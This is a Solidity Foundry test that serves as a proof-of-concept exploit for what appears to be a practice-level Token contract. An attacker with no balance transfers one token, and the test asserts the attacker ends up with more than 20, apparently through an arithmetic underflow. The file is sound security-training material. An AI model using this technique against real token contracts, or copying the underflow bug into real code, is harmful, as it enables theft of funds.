// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Token} from "../../src/attacks/Token.sol";

contract TokenTest is Test {
    Token target;
    address attacker = makeAddr("attacker");

    function setUp() public {
        target = new Token(20);
    }

    function test_exploit() public {
        vm.prank(attacker);
        target.transfer(address(this), 1);

        assertEq(target.balanceOf(address(this)), 21);
        assertGt(target.balanceOf(attacker), 20);
    }
}
